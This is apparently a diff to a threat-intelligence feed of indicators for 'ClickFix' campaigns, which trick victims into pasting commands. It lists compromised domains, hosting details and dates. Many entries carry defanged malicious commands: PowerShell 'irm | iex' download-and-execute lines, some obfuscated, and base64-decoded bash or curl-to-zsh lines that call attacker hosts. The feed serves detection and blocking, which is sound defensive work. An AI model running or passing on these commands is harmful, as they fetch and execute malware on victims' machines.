@@ -5,7 +5,7 @@
   "short": "Fake checks that get victims to paste and run a command",
   "summary": "A fake CAPTCHA, browser update or error message, usually injected into a hacked legitimate website, copies a command to the clipboard and tells the victim to paste it into the Run dialog, a terminal or PowerShell. The command downloads and runs malware, typically an information stealer or a remote-access tool. Some campaigns fetch their next stage from a public blockchain so the hacked site never has to change."
  },
- "count": 5747,
+ "count": 5749,
  "indicators": [
   {
    "indicator": "06services.it",
@@ -11340,20 +11340,20 @@
    "product": null,
    "hosting": "Cloudflare (proxied)",
    "dns": "Namecheap",
-   "ip": "141.193.213.10",
+   "ip": "141.193.213.11",
    "asn": "AS209242",
    "org": "CLOUDFLARESPECTRUM Cloudflare London, LLC, US",
    "country": "US",
    "ips": [
     {
-     "ip": "141.193.213.10",
+     "ip": "141.193.213.11",
      "asn": "AS209242",
      "org": "CLOUDFLARESPECTRUM Cloudflare London, LLC, US",
      "first_seen": "2026-10-18",
      "last_seen": "2026-11-21"
     },
     {
-     "ip": "141.193.213.11",
+     "ip": "141.193.213.10",
      "asn": "AS209242",
      "org": "CLOUDFLARESPECTRUM Cloudflare London, LLC, US",
      "first_seen": "2026-10-18",
@@ -14194,57 +14194,6 @@
    ]
   },
   {
-   "indicator": "aerogamingonline.nl",
-   "type": "domain",
-   "category": "clickfix",
-   "backend_for": null,
-   "campaign": null,
-   "role": "Redirector",
-   "status": "online",
-   "first_seen": "2026-10-25",
-   "last_seen": "2026-10-25",
-   "last_online": "2026-11-21",
-   "offline_since": null,
-   "url": "https://aerogamingonline.nl/",
-   "brand": null,
-   "product": null,
-   "hosting": "Cloudflare (proxied)",
-   "dns": "Cloudflare",
-   "ip": "172.67.153.195",
-   "asn": "AS13335",
-   "org": "CLOUDFLARENET - Cloudflare, Inc., US",
-   "country": null,
-   "ips": [
-    {
-     "ip": "172.67.153.195",
-     "asn": "AS13335",
-     "org": "CLOUDFLARENET - Cloudflare, Inc., US",
-     "first_seen": "2026-10-25",
-     "last_seen": "2026-10-25"
-    }
-   ],
-   "hosts": [
-    {
-     "host": "aerogamingonline.nl",
-     "status": "online",
-     "first_seen": "2026-10-25",
-     "last_seen": "2026-10-25"
-    }
-   ],
-   "actor": null,
-   "actor_link": null,
-   "commands": [
-    "IRM fastly[.]jsdelivr[.]net/g\"h\"/Katy7684/76-51fd-42c5-8717-[id]/10-9B-D0-8D-B2-CB | IEX",
-    "IRM fastly[.]jsdelivr[.]net/g\"h\"/Katy7684/76-51fd-42c5-8717-[id]/90b-8cc3-[id] | IEX",
-    "IRM fastly[.]jsdelivr[.]net/g\"h\"/sdedyk172/ad8f6908-5019-42ff-a88e-[id]/9cc8ac42-ee34-4250-bfee-[id] | IEX"
-   ],
-   "connects_to": [
-    "di1upsa3.deocultismo.com",
-    "ww0fcrnl.charcuteriecompany.com"
-   ],
-   "lure_from": []
-  },
-  {
    "indicator": "aeternavictrix.com",
    "type": "domain",
    "category": "clickfix",
@@ -15656,61 +15605,6 @@
     "xzpcb7ee.etext.store"
    ],
    "lure_from": []
-  },
-  {
-   "indicator": "aiolos.media",
-   "type": "domain",
-   "category": "clickfix",
-   "backend_for": null,
-   "campaign": null,
-   "role": "Redirector",
-   "status": "online",
-   "first_seen": "2026-11-07",
-   "last_seen": "2026-11-09",
-   "last_online": "2026-11-21",
-   "offline_since": null,
-   "url": "https://aiolos.media/",
-   "brand": null,
-   "product": null,
-   "hosting": "Cloudflare (proxied)",
-   "dns": "Cloudflare",
-   "ip": "172.67.203.246",
-   "asn": "AS13335",
-   "org": "CLOUDFLARENET - Cloudflare, Inc., US",
-   "country": null,
-   "ips": [
-    {
-     "ip": "172.67.203.246",
-     "asn": "AS13335",
-     "org": "CLOUDFLARENET - Cloudflare, Inc., US",
-     "first_seen": "2026-11-07",
-     "last_seen": "2026-11-09"
-    }
-   ],
-   "hosts": [
-    {
-     "host": "aiolos.media",
-     "status": "online",
-     "first_seen": "2026-11-07",
-     "last_seen": "2026-11-09"
-    }
-   ],
-   "actor": null,
-   "actor_link": null,
-   "commands": [
-    "(irm 'hxxps[:]//lepafonso[.]bz/proliv_dante/[id]' -Headers @{'X-WUA'='[id]'} -TimeoutSec 45)|&('i'+'e'+'x')",
-    "(irm 'hxxps[:]//t-trustresnew[.]com/dan_proliv/[id]')|iex",
-    "curl -s $(echo \"[encoded]\" | openssl base64 -d -A) | zsh ; curl -fsS 'hxxps[:]//xorados[.]com/x/dan_proliv' >/dev/null"
-   ],
-   "connects_to": [
-    "lepafonso.bz",
-    "t-trustresnew.com",
-    "xorados.com",
-    "trek-72.com"
-   ],
-   "lure_from": [
-    "interseq.at"
-   ]
   },
   {
    "indicator": "aipark.tech",
@@ -22954,7 +22848,8 @@
     "hagosuro.lc",
     "t-trustresnew.com",
     "xorados.com",
-    "trek-72.com"
+    "trek-72.com",
+    "lepafonso.bz"
    ],
    "lure_from": [
     "interseq.at"
@@ -30708,7 +30603,8 @@
     "codes.caffe-img.com",
     "codes.browse-cdn.beer",
     "browse-nnccodes.beer",
-    "browse-cloud.codes"
+    "browse-cloud.codes",
+    "img-codes-cloude.info"
    ]
   },
   {
@@ -41932,6 +41828,53 @@
    "lure_from": []
   },
   {
+   "indicator": "bento4d-abc.com",
+   "type": "domain",
+   "category": "clickfix",
+   "backend_for": null,
+   "campaign": null,
+   "role": "Redirector",
+   "status": "online",
+   "first_seen": "2026-11-21",
+   "last_seen": "2026-11-21",
+   "last_online": "2026-11-21",
+   "offline_since": null,
+   "url": "https://bento4d-abc.com/",
+   "brand": null,
+   "product": null,
+   "hosting": "Cloudflare (proxied)",
+   "dns": "Cloudflare",
+   "ip": "188.114.97.3",
+   "asn": "AS13335",
+   "org": "CLOUDFLARENET - Cloudflare, Inc., US",
+   "country": null,
+   "ips": [
+    {
+     "ip": "188.114.97.3",
+     "asn": "AS13335",
+     "org": "CLOUDFLARENET - Cloudflare, Inc., US",
+     "first_seen": "2026-11-21",
+     "last_seen": "2026-11-21"
+    }
+   ],
+   "hosts": [
+    {
+     "host": "bento4d-abc.com",
+     "status": "online",
+     "first_seen": "2026-11-21",
+     "last_seen": "2026-11-21"
+    }
+   ],
+   "actor": null,
+   "actor_link": null,
+   "commands": [],
+   "connects_to": [],
+   "lure_from": [
+    "api.ipquery.io",
+    "tdssecure.beer"
+   ]
+  },
+  {
    "indicator": "benu.com.br",
    "type": "domain",
    "category": "clickfix",
@@ -46447,11 +46390,14 @@
    "actor_link": null,
    "commands": [
     "(irm 'hxxps[:]//lepafonso[.]bz/proliv_dante/[id]' -Headers @{'X-WUA'='[id]'} -TimeoutSec 45)|&('i'+'e'+'x')",
-    "(irm 'hxxps[:]//github[.]pw/prolivdante1/[id]')|iex"
+    "(irm 'hxxps[:]//github[.]pw/prolivdante1/[id]')|iex",
+    "(irm 'hxxps[:]//j7tracker[.]gb[.]net/prolivdante1/[id]')|iex"
    ],
    "connects_to": [
     "lepafonso.bz",
-    "github.pw"
+    "github.pw",
+    "j7tracker.gb.net",
+    "holodeo.net"
    ],
    "lure_from": [
     "interseq.at"
@@ -51822,23 +51768,23 @@
    "product": null,
    "hosting": "Cloudflare (proxied)",
    "dns": "Cloudflare",
-   "ip": "141.193.213.11",
+   "ip": "141.193.213.10",
    "asn": "AS209242",
    "org": "CLOUDFLARESPECTRUM Cloudflare London, LLC, US",
    "country": "US",
    "ips": [
     {
-     "ip": "141.193.213.11",
-     "asn": "AS209242",
-     "org": "CLOUDFLARESPECTRUM Cloudflare London, LLC, US",
-     "first_seen": "2026-10-18",
-     "last_seen": "2026-11-21"
-    },
-    {
      "ip": "141.193.213.10",
      "asn": "AS209242",
      "org": "CLOUDFLARESPECTRUM Cloudflare London, LLC, US",
      "first_seen": "2026-11-04",
+     "last_seen": "2026-11-21"
+    },
+    {
+     "ip": "141.193.213.11",
+     "asn": "AS209242",
+     "org": "CLOUDFLARESPECTRUM Cloudflare London, LLC, US",
+     "first_seen": "2026-10-18",
      "last_seen": "2026-11-21"
     }
    ],
@@ -63755,7 +63701,9 @@
    "connects_to": [
     "browse-cloud.codes"
    ],
-   "lure_from": []
+   "lure_from": [
+    "img-codes-cloude.info"
+   ]
   },
   {
    "indicator": "centralnj-pestcontrol.com",
@@ -77585,7 +77533,7 @@
    "last_seen": "2026-11-21",
    "last_online": "2026-11-21",
    "offline_since": null,
-   "url": "http://cruisevacationhq.com/",
+   "url": "https://cruisevacationhq.com/",
    "brand": null,
    "product": null,
    "hosting": "Cloudflare (proxied)",
@@ -80442,11 +80390,13 @@
    "actor_link": null,
    "commands": [
     "(irm 'hxxps[:]//t-trustresnew[.]com/click/[id]')|iex",
-    "echo \"Checking...\" && echo '[encoded]' | base64 -d | bash && echo \"Done! ; curl -fsS 'hxxps[:]//t-trustresnew[.]com/x/click' >/dev/null\"",
-    "echo \"Checking.\" && echo '[encoded]' | base64 -d | bash && echo \"Done! ; curl -fsS 'hxxps[:]//trustchecknes[.]com/x/click' >/dev/null\""
+    "(irm 'hxxps[:]//j7tracker[.]gb[.]net/click/[id]')|iex",
+    "echo [encoded] | base64 -d | bash ; curl -fsS 'hxxps[:]//j7tracker[.]gb[.]net/x/click' >/dev/null"
    ],
    "connects_to": [
     "t-trustresnew.com",
+    "j7tracker.gb.net",
+    "appget29.tools",
     "getpkg0.tools",
     "trustchecknes.com",
     "toolset17.tools"
@@ -92965,6 +92915,7 @@
    ],
    "lure_from": [
     "browse-cloud.codes",
+    "img-codes-cloude.info",
     "ncheck-brows.beer",
     "codes.browse-cdn.beer"
    ]
@@ -103709,20 +103660,21 @@
    "actor": null,
    "actor_link": null,
    "commands": [
-    "irm 'jscdncloude[.]beer/[id]'|iex;",
     "irm 'ncheck-brows[.]beer/[id]'|iex;",
-    "irm 'id-verfied.boats/[id]'|iex;"
+    "irm 'id-verfied.boats/[id]'|iex;",
+    "irm 'jscdncloude[.]beer/[id]'|iex;"
    ],
    "connects_to": [
-    "jscdncloude.beer",
     "ncheck-brows.beer",
-    "id-verfied.boats"
+    "id-verfied.boats",
+    "jscdncloude.beer"
    ],
    "lure_from": [
     "codes.caffe-img.com",
     "codes.browse-cdn.beer",
     "browse-nnccodes.beer",
-    "browse-cloud.codes"
+    "browse-cloud.codes",
+    "img-codes-cloude.info"
    ]
   },
   {
@@ -127301,11 +127253,14 @@
    "actor": null,
    "actor_link": null,
    "commands": [
-    "(irm 'hxxps[:]//github[.]pw/click/[id]')|iex",
-    "echo [encoded] | base64 -d | bash ; curl -fsS 'hxxps[:]//github[.]pw/x/click' >/dev/null"
+    "(irm 'hxxps[:]//j7tracker[.]gb[.]net/click/[id]')|iex",
+    "echo [encoded] | base64 -d | bash ; curl -fsS 'hxxps[:]//j7tracker[.]gb[.]net/x/click' >/dev/null",
+    "(irm 'hxxps[:]//github[.]pw/click/[id]')|iex"
    ],
    "connects_to": [
+    "j7tracker.gb.net",
     "github.pw",
+    "appget29.tools",
     "getpkg0.tools"
    ],
    "lure_from": [
@@ -130659,10 +130614,10 @@
    "role": "Redirector",
    "status": "online",
    "first_seen": "2026-11-19",
-   "last_seen": "2026-11-20",
+   "last_seen": "2026-11-21",
    "last_online": "2026-11-21",
    "offline_since": null,
-   "url": "https://www.gunturwebdesigning.com/",
+   "url": "https://ulmherbals.gunturwebdesigning.com/",
    "brand": null,
    "product": null,
    "hosting": "IONOS",
@@ -130677,7 +130632,7 @@
      "asn": "AS8560",
      "org": "IONOS-AS IONOS SE, DE",
      "first_seen": "2026-11-19",
-     "last_seen": "2026-11-20"
+     "last_seen": "2026-11-21"
     }
    ],
    "hosts": [
@@ -130685,7 +130640,7 @@
      "host": "ulmherbals.gunturwebdesigning.com",
      "status": "online",
      "first_seen": "2026-11-19",
-     "last_seen": "2026-11-19"
+     "last_seen": "2026-11-21"
     },
     {
      "host": "www.gunturwebdesigning.com",
@@ -149291,7 +149246,7 @@
    "product": null,
    "hosting": "Cloudflare (proxied)",
    "dns": "Cloudflare",
-   "ip": "2606:4700:3030::6815:47b9",
+   "ip": "172.67.148.16",
    "asn": "AS13335",
    "org": "CLOUDFLARENET - Cloudflare, Inc., US",
    "country": null,
@@ -155466,61 +155421,6 @@
    "lure_from": []
   },
   {
-   "indicator": "jeyms.com",
-   "type": "domain",
-   "category": "clickfix",
-   "backend_for": null,
-   "campaign": null,
-   "role": "Redirector",
-   "status": "online",
-   "first_seen": "2026-11-07",
-   "last_seen": "2026-11-11",
-   "last_online": "2026-11-21",
-   "offline_since": null,
-   "url": "https://www.jeyms.com/",
-   "brand": null,
-   "product": null,
-   "hosting": "O2SWITCH O2SWITCH SAS",
-   "dns": "o2switch.net",
-   "ip": "109.234.165.211",
-   "asn": "AS50474",
-   "org": "O2SWITCH O2SWITCH SAS, FR",
-   "country": "FR",
-   "ips": [
-    {
-     "ip": "109.234.165.211",
-     "asn": "AS50474",
-     "org": "O2SWITCH O2SWITCH SAS, FR",
-     "first_seen": "2026-11-07",
-     "last_seen": "2026-11-11"
-    }
-   ],
-   "hosts": [
-    {
-     "host": "www.jeyms.com",
-     "status": "online",
-     "first_seen": "2026-11-07",
-     "last_seen": "2026-11-11"
-    }
-   ],
-   "actor": null,
-   "actor_link": null,
-   "commands": [
-    "(irm 'hxxps[:]//t-trustresnew[.]com/click/[id]')|iex",
-    "echo \"Checking...\" && echo '[encoded]' | base64 -d | bash && echo \"Done! ; curl -fsS 'hxxps[:]//t-trustresnew[.]com/x/click' >/dev/null\"",
-    "echo \"Checking.\" && echo '[encoded]' | base64 -d | bash && echo \"Done! ; curl -fsS 'hxxps[:]//trustchecknes[.]com/x/click' >/dev/null\""
-   ],
-   "connects_to": [
-    "t-trustresnew.com",
-    "getpkg0.tools",
-    "trustchecknes.com",
-    "toolset17.tools"
-   ],
-   "lure_from": [
-    "interseq.at"
-   ]
-  },
-  {
    "indicator": "jfrpack.com",
    "type": "domain",
    "category": "clickfix",
@@ -157491,8 +157391,8 @@
    ],
    "connects_to": [
     "xorados.com",
-    "t-trustrest.com",
     "hagosuro.lc",
+    "t-trustrest.com",
     "trek-72.com",
     "groverudder12.com",
     "t-trustresnew.com",
@@ -171449,6 +171349,54 @@
     "IRM fastly[.]jsdelivr[.]net/g\"h\"/Grog1274/ec73471d-b7e6-4a5f-bcfd-[id]/7d4-8230-404f-9874-[id] | IEX"
    ],
    "connects_to": [],
+   "lure_from": []
+  },
+  {
+   "indicator": "lejardindunous.com",
+   "type": "domain",
+   "category": "clickfix",
+   "backend_for": null,
+   "campaign": null,
+   "role": "Phishing page",
+   "status": "online",
+   "first_seen": "2026-11-21",
+   "last_seen": "2026-11-21",
+   "last_online": "2026-11-21",
+   "offline_since": null,
+   "url": "http://lejardindunous.com/",
+   "brand": null,
+   "product": null,
+   "hosting": "LWS Groupe LWS SARL",
+   "dns": "lwsdns.com",
+   "ip": "83.229.19.88",
+   "asn": "AS210403",
+   "org": "LWS Groupe LWS SARL, FR",
+   "country": "FR",
+   "ips": [
+    {
+     "ip": "83.229.19.88",
+     "asn": "AS210403",
+     "org": "LWS Groupe LWS SARL, FR",
+     "first_seen": "2026-11-21",
+     "last_seen": "2026-11-21"
+    }
+   ],
+   "hosts": [
+    {
+     "host": "lejardindunous.com",
+     "status": "online",
+     "first_seen": "2026-11-21",
+     "last_seen": "2026-11-21"
+    }
+   ],
+   "actor": null,
+   "actor_link": null,
+   "commands": [
+    "(irm 'hxxps[:]//holodeo[.]net/saykatproliv1/[id]' -Headers @{'X-WUA'='[id]'} -TimeoutSec 45)|&('i'+'e'+'x')"
+   ],
+   "connects_to": [
+    "holodeo.net"
+   ],
    "lure_from": []
   },
   {
@@ -186465,7 +186413,8 @@
     "lepafonso.bz",
     "t-trustresnew.com",
     "xorados.com",
-    "trek-72.com"
+    "trek-72.com",
+    "j7tracker.gb.net"
    ],
    "lure_from": [
     "interseq.at",
@@ -191891,7 +191840,7 @@
    "role": "Redirector",
    "status": "online",
    "first_seen": "2026-11-15",
-   "last_seen": "2026-11-17",
+   "last_seen": "2026-11-21",
    "last_online": "2026-11-21",
    "offline_since": null,
    "url": "https://www.mirkomiletic.rs/",
@@ -191909,7 +191858,7 @@
      "asn": "AS8400",
      "org": "TELEKOM-AS TELEKOM SRBIJA a.d., RS",
      "first_seen": "2026-11-15",
-     "last_seen": "2026-11-17"
+     "last_seen": "2026-11-21"
     }
    ],
    "hosts": [
@@ -191917,7 +191866,7 @@
      "host": "www.mirkomiletic.rs",
      "status": "online",
      "first_seen": "2026-11-15",
-     "last_seen": "2026-11-17"
+     "last_seen": "2026-11-21"
     }
    ],
    "actor": null,
@@ -195788,11 +195737,13 @@
    "actor_link": null,
    "commands": [
     "(irm 'hxxps[:]//t-trustresnew[.]com/click/[id]')|iex",
-    "echo \"Checking...\" && echo '[encoded]' | base64 -d | bash && echo \"Done! ; curl -fsS 'hxxps[:]//t-trustresnew[.]com/x/click' >/dev/null\"",
-    "echo \"Checking.\" && echo '[encoded]' | base64 -d | bash && echo \"Done! ; curl -fsS 'hxxps[:]//trustchecknes[.]com/x/click' >/dev/null\""
+    "(irm 'hxxps[:]//j7tracker[.]gb[.]net/click/[id]')|iex",
+    "echo [encoded] | base64 -d | bash ; curl -fsS 'hxxps[:]//j7tracker[.]gb[.]net/x/click' >/dev/null"
    ],
    "connects_to": [
     "t-trustresnew.com",
+    "j7tracker.gb.net",
+    "appget29.tools",
     "getpkg0.tools",
     "trustchecknes.com",
     "toolset17.tools"
@@ -198068,9 +198019,11 @@
    "actor": null,
    "actor_link": null,
    "commands": [
+    "(irm 'hxxps[:]//j7tracker[.]gb[.]net/8pchkbdes5/[id]')|iex",
     "(irm 'hxxps[:]//github[.]pw/8pchkbdes5/[id]')|iex"
    ],
    "connects_to": [
+    "j7tracker.gb.net",
     "github.pw"
    ],
    "lure_from": [
@@ -203064,7 +203017,7 @@
    "role": "Redirector",
    "status": "online",
    "first_seen": "2026-11-15",
-   "last_seen": "2026-11-15",
+   "last_seen": "2026-11-21",
    "last_online": "2026-11-21",
    "offline_since": null,
    "url": "https://niss.edu.rs/",
@@ -203072,11 +203025,18 @@
    "product": null,
    "hosting": "Cloudflare (proxied)",
    "dns": "Cloudflare",
-   "ip": "188.114.96.3",
+   "ip": "188.114.97.3",
    "asn": "AS13335",
    "org": "CLOUDFLARENET - Cloudflare, Inc., US",
    "country": null,
    "ips": [
+    {
+     "ip": "188.114.97.3",
+     "asn": "AS13335",
+     "org": "CLOUDFLARENET - Cloudflare, Inc., US",
+     "first_seen": "2026-11-21",
+     "last_seen": "2026-11-21"
+    },
     {
      "ip": "188.114.96.3",
      "asn": "AS13335",
@@ -203090,7 +203050,7 @@
      "host": "niss.edu.rs",
      "status": "online",
      "first_seen": "2026-11-15",
-     "last_seen": "2026-11-15"
+     "last_seen": "2026-11-21"
     }
    ],
    "actor": null,
@@ -205993,7 +205953,7 @@
    "role": "Redirector",
    "status": "online",
    "first_seen": "2026-10-18",
-   "last_seen": "2026-11-19",
+   "last_seen": "2026-11-21",
    "last_online": "2026-11-21",
    "offline_since": null,
    "url": "https://oakandstoneproperty.com/",
@@ -206011,7 +205971,7 @@
      "asn": "AS209242",
      "org": "CLOUDFLARESPECTRUM Cloudflare London, LLC, US",
      "first_seen": "2026-10-18",
-     "last_seen": "2026-11-19"
+     "last_seen": "2026-11-21"
     }
    ],
    "hosts": [
@@ -206019,7 +205979,7 @@
      "host": "oakandstoneproperty.com",
      "status": "online",
      "first_seen": "2026-10-18",
-     "last_seen": "2026-11-19"
+     "last_seen": "2026-11-21"
     }
    ],
    "actor": null,
@@ -207513,7 +207473,9 @@
    "connects_to": [
     "browse-cloud.codes"
    ],
-   "lure_from": []
+   "lure_from": [
+    "img-codes-cloude.info"
+   ]
   },
   {
    "indicator": "olivercash.co.uk",
@@ -224929,7 +224891,8 @@
     "lskannsserv.beer",
     "codes.browse-cdn.beer",
     "browse-nnccodes.beer",
-    "browse-cloud.codes"
+    "browse-cloud.codes",
+    "img-codes-cloude.info"
    ]
   },
   {
@@ -235312,6 +235275,56 @@
    ],
    "connects_to": [],
    "lure_from": []
+  },
+  {
+   "indicator": "rocky.consulting",
+   "type": "domain",
+   "category": "clickfix",
+   "backend_for": null,
+   "campaign": null,
+   "role": "Redirector",
+   "status": "online",
+   "first_seen": "2026-11-21",
+   "last_seen": "2026-11-21",
+   "last_online": "2026-11-21",
+   "offline_since": null,
+   "url": "https://rocky.consulting/",
+   "brand": null,
+   "product": null,
+   "hosting": "ASFS3 Fiberstream 87 AG",
+   "dns": "made-easy.ch",
+   "ip": "185.62.81.188",
+   "asn": "AS60016",
+   "org": "ASFS3 Fiberstream 87 AG, CH",
+   "country": "CH",
+   "ips": [
+    {
+     "ip": "185.62.81.188",
+     "asn": "AS60016",
+     "org": "ASFS3 Fiberstream 87 AG, CH",
+     "first_seen": "2026-11-21",
+     "last_seen": "2026-11-21"
+    }
+   ],
+   "hosts": [
+    {
+     "host": "rocky.consulting",
+     "status": "online",
+     "first_seen": "2026-11-21",
+     "last_seen": "2026-11-21"
+    }
+   ],
+   "actor": null,
+   "actor_link": null,
+   "commands": [
+    "(irm 'hxxps[:]//j7tracker[.]gb[.]net/8pchkbdes5/[id]')|iex"
+   ],
+   "connects_to": [
+    "j7tracker.gb.net"
+   ],
+   "lure_from": [
+    "interseq.at"
+   ]
   },
   {
    "indicator": "rockyscrownpub.com",
@@ -253293,6 +253306,56 @@
    "connects_to": [],
    "lure_from": [
     "sky.dolcefantasia.us"
+   ]
+  },
+  {
+   "indicator": "sky-clean.com.au",
+   "type": "domain",
+   "category": "clickfix",
+   "backend_for": null,
+   "campaign": null,
+   "role": "Phishing page",
+   "status": "online",
+   "first_seen": "2026-11-21",
+   "last_seen": "2026-11-21",
+   "last_online": "2026-11-21",
+   "offline_since": null,
+   "url": "https://sky-clean.com.au/",
+   "brand": null,
+   "product": null,
+   "hosting": "Cloud8 Cloud 8 Cloud Computing Ltd.",
+   "dns": "GoDaddy",
+   "ip": "141.226.241.10",
+   "asn": "AS199393",
+   "org": "Cloud8 Cloud 8 Cloud Computing Ltd., IL",
+   "country": "IL",
+   "ips": [
+    {
+     "ip": "141.226.241.10",
+     "asn": "AS199393",
+     "org": "Cloud8 Cloud 8 Cloud Computing Ltd., IL",
+     "first_seen": "2026-11-21",
+     "last_seen": "2026-11-21"
+    }
+   ],
+   "hosts": [
+    {
+     "host": "sky-clean.com.au",
+     "status": "online",
+     "first_seen": "2026-11-21",
+     "last_seen": "2026-11-21"
+    }
+   ],
+   "actor": null,
+   "actor_link": null,
+   "commands": [
+    "(irm 'hxxps[:]//holodeo[.]net/saykatproliv1/[id]' -Headers @{'X-WUA'='[id]'} -TimeoutSec 45)|&('i'+'e'+'x')"
+   ],
+   "connects_to": [
+    "holodeo.net"
+   ],
+   "lure_from": [
+    "interseq.at"
    ]
   },
   {
@@ -291646,6 +291709,58 @@
    ]
   },
   {
+   "indicator": "univers-de-la-deco.fr",
+   "type": "domain",
+   "category": "clickfix",
+   "backend_for": null,
+   "campaign": null,
+   "role": "Redirector",
+   "status": "online",
+   "first_seen": "2026-11-21",
+   "last_seen": "2026-11-21",
+   "last_online": "2026-11-21",
+   "offline_since": null,
+   "url": "https://www.univers-de-la-deco.fr/",
+   "brand": null,
+   "product": null,
+   "hosting": "PlanetHoster",
+   "dns": "OVH",
+   "ip": "146.88.236.244",
+   "asn": "AS53589",
+   "org": "PLANETHOSTER-8 - PlanetHoster, CA",
+   "country": "FR",
+   "ips": [
+    {
+     "ip": "146.88.236.244",
+     "asn": "AS53589",
+     "org": "PLANETHOSTER-8 - PlanetHoster, CA",
+     "first_seen": "2026-11-21",
+     "last_seen": "2026-11-21"
+    }
+   ],
+   "hosts": [
+    {
+     "host": "www.univers-de-la-deco.fr",
+     "status": "online",
+     "first_seen": "2026-11-21",
+     "last_seen": "2026-11-21"
+    }
+   ],
+   "actor": null,
+   "actor_link": null,
+   "commands": [
+    "(irm 'hxxp[:]//hagosuro[.]lc/dantestraff18/[id]' -UserAgent 'WUA/[id]' -Headers @{'X-WUA'='[id]'})|iex",
+    "(irm 'hxxps[:]//j7tracker[.]gb[.]net/prolivdante1/[id]')|iex"
+   ],
+   "connects_to": [
+    "hagosuro.lc",
+    "j7tracker.gb.net"
+   ],
+   "lure_from": [
+    "interseq.at"
+   ]
+  },
+  {
    "indicator": "universalfood.dz",
    "type": "domain",
    "category": "clickfix",
@@ -294503,11 +294618,12 @@
    "commands": [
     "curl -s $(echo \"[encoded]\" | openssl base64 -d -A) | zsh",
     "(irm 'hxxps[:]//t-trustrest[.]com/ae8ouxb9gx/[id]' -UserAgent 'WUA/[id]' -Headers @{'X-WUA'='[id]'} -TimeoutSec 45)|iex",
-    "(irm 'hxxps[:]//github[.]pw/8pchkbdes5/[id]')|iex"
+    "(irm 'hxxps[:]//j7tracker[.]gb[.]net/8pchkbdes5/[id]')|iex"
    ],
    "connects_to": [
     "trek-72.com",
     "t-trustrest.com",
+    "j7tracker.gb.net",
     "github.pw",
     "t-trustresnew.com",
     "trustchecknes.com"
@@ -295582,7 +295698,8 @@
    ],
    "lure_from": [
     "ncheck-brows.beer",
-    "browse-cloud.codes"
+    "browse-cloud.codes",
+    "img-codes-cloude.info"
    ]
   },
   {
@@ -312005,6 +312122,7 @@
     "interseq.at",
     "nikogdatakonebilo.cc",
     "biboiboboorl.org",
+    "yellow-monkey.cfd",
     "yaebalciganovvjopu.org",
     "pizdalisibivet.org",
     "efreitorher.org",
